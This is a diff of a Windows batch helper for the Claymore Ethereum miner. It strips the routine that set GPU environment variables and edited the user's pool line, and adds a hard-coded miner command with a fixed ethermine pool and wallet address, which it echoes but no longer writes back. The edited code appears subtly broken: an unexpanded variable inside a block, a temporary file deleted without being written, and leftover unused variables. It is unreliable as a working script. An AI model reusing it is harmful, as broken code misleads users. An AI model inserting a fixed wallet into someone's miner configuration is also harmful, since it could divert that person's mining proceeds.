@@ -35,29 +35,15 @@ if exist %aloc% (
 
 if not "%file%" == "" (
 
-	set gpuset=0
-
 	set written=parameter already set.
 
 	for /f "tokens=* usebackq" %%f in (%file%) do (
 
-		echo %%f|>nul findstr /L /C:"GPU_" && set gpuset=1
-		
 		echo %%f|>nul findstr /L /C:"epool" && (
 
-			echo %%f|>nul findstr /L /C:"eres" && (
+			set wline=!file!\EthDcrMiner64.exe -mode 1 -eres 0 -epool stratum+ssl://eu1.ethermine.org:5555 -epsw x -ewal 0x75374b45d5eb965fDeDbb5E1fA0EDE99fb62b561.%1
 
-				echo %%f>>tmp
-
-			) || (
-
-				set line=%%f -eres 0
-
-			  	echo !line!>>tmp
-
-				set written=!line!
-
-			)
+			echo %wline%
 
 		) || (
 
@@ -67,26 +53,8 @@ if not "%file%" == "" (
 
 	)
 
-	if "!gpuset!" == "0" (
 
-		>%file% echo setx GPU_FORCE_64BIT_PTR 0
-		>>%file% echo setx GPU_MAX_HEAP_SIZE 100
-		>>%file% echo setx GPU_USE_SYNC_OBJECTS 1
-		>>%file% echo setx GPU_MAX_ALLOC_PERCENT 100
-		>>%file% echo setx GPU_SINGLE_ALLOC_PERCENT 100
-
-		echo GPU_PARAMS are written...
-
-	) else (
-
-		break>%file%
-
-		echo GPU_PARAMS are already set...
-
-	)
-
-
-	for /f "tokens=* usebackq" %%f in (tmp) do echo %%f>>%file%
+	rem for /f "tokens=* usebackq" %%f in (tmp) do echo %%f>>%file%
 
 	del tmp
 
